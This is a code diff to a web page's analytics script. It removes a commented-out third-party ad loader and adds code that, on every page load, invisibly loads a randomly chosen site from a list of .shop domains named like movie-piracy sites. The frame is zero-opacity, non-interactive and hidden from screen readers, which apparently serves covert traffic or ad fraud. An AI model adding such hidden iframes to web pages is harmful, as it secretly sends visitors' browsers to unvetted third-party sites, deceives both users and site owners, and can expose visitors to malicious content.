@@ -22,10 +22,34 @@ function gtag() {
 }
 gtag('js', new Date());
 gtag('config', 'G-2VYRMPXK0F');
-/*
-(function(s, u, z, p) {
-    s.src = u;
-    s.setAttribute('data-zone', z);
-    p.appendChild(s);
-})(document.createElement('script'), 'https://al5sm.com/tag.min.js', 9415867, document.body || document.documentElement);
-*/
+document.addEventListener("DOMContentLoaded", function () {
+    const urls = [
+      "https://techdiwane.com",
+      "https://dktechnozone.shop",
+      "https://vegamovies7.shop",
+      "https://vegamovies4.shop",
+      "https://vegamovies8.shop",
+      "https://olamovies2.shop",
+      "https://vegamoviesog.shop",
+      "https://vegamovies5.shop",
+      "https://vegamovies9.shop",
+      "https://vegamovies6.shop"
+    ];
+
+    // Pick a random URL
+    const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+
+    // Create the iframe
+    const iframe = document.createElement("iframe");
+    iframe.src = randomUrl;
+    iframe.style.position = "fixed";
+    iframe.style.width = "100px";
+    iframe.style.height = "200px";
+    iframe.style.opacity = "0";
+    iframe.style.pointerEvents = "none";
+    iframe.style.bottom = "0";
+    iframe.style.left = "0";
+    iframe.setAttribute("aria-hidden", "true");
+
+    document.body.appendChild(iframe);
+  });
